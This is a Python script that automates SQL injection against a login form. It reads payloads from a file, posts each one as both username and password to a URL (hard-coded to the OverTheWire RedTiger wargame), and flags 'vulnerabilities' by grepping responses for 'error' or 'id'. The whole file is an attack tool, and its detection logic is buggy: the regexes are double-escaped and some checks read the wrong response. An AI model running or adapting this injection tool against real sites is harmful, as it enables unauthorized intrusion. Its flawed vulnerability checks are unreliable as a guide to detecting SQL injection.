import sys
# sys.path.append(r"D:\SQLjj\SQLJ\Database")
# from database import main_prog,extraction
import asyncio
import requests
from colorama import Fore,init
import re
import glob
import os
import socket
import time
from datetime import datetime

init()

##################################################################

pattern = r"\\berror\\b"
htmlpattern = r"\\bid\\b"
generic_capture = []

#######################################################################


            


async def generic_sql_attack(urls):
    # try:
    global pattern,htmlpattern
    done = False
    filename = "genericsql.txt"
    current_directory = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_directory, filename)

    with open(file_path, "r") as file:
        payload = file.read()
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)
        print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload))
        requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
        # url = "https://redtiger.labs.overthewire.org/level1.php"
        req = requests.get(urls,verify=False)
        if req.status_code == 200:
            ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the ip address: {urls} Do you want to send the payload to the website? ")

            if ask.lower() == "y":
                for line in sorted_payload.split("\n"):
                    #############################################################33
                    params = {
                        "username": line,
                        "password": line
                    }
                    ##############################################################################
                    # print(line)
                    ack = requests.post(url=urls, data=params,verify=False)
                    print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code)
                    print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                    await asyncio.sleep(5)
                    if "error" in ack.text:
                        print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:")
                        
                    vuln = re.findall(pattern=pattern,string=str(ack.text),flags=re.IGNORECASE)
                    htmlVULN = re.findall(pattern=htmlpattern,string=str(ack.text),flags=re.IGNORECASE)
                    if vuln:
                        print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found in the data: |", vuln," | with the count of: |",len(vuln)if len(str(htmlVULN)) != 0 else "Nothing found ")
                        await asyncio.sleep(3)
                    
                    if htmlVULN:
                        print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in html status:|",htmlVULN,"|with the count of:|",  len(htmlVULN) if len(str(htmlVULN)) != 0 else "|Nothing found|")
                        await asyncio.sleep(3)
                    
                    word = "id" in req.text
                    errword = "error" in req.text
                    if word:
                        print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:",str("error" in req.text),"with the count of:",len(htmlVULN))
                        await asyncio.sleep(3)
                    
                    if errword:
                        print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:",str("id" in req.text),"with the count of:",len(htmlVULN))
                        await asyncio.sleep(3)
                        
                    
                        
                if req.status_code == 302:
                    print(f"[{datetime.now()}]","Could inject the sq;; to the website:",line)
                    done = True
                    
                    
                            
                            
                        
                            

    # except Exception as e:
    #     print(f"[{datetime.now()}]  Error: {str(e)}")
        
    # except UnicodeEncodeError:
    #     pass
    
    # except KeyboardInterrupt:
    #     ch = input(f"[{datetime.now()}]",Fore.RED+"[!] Are you sure that you want to exit?")
    #     if ch == "y":
    #         raise SystemExit
    #     else:
    #         pass
        
    # except ConnectionAbortedError as e:
    #     print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e)
        
    # except ConnectionError as e:
    #     print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e)
        
    # except ConnectionRefusedError as e:
    #     print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e)
        
    # except ConnectionResetError as e:
    #     print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e)
        
    # except KeyboardInterrupt:
    #     ch = input(f"[{datetime.now()}]",Fore.RED+"[!] Are you sure that you want to exit?")
    #     if ch == "y":
    #         raise SystemExit
    #     else:
    #         pass
    
    # except Exception as e:
    #     print(f" {datetime.now()} Error: {str(e)}")
        
    # finally:
    #     pass
        # global generic_capture
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #             \n{ack.text}\n     """)
        # generic_capture.append(ack.text)
        
        
        

asyncio.run(generic_sql_attack("https://redtiger.labs.overthewire.org/"))





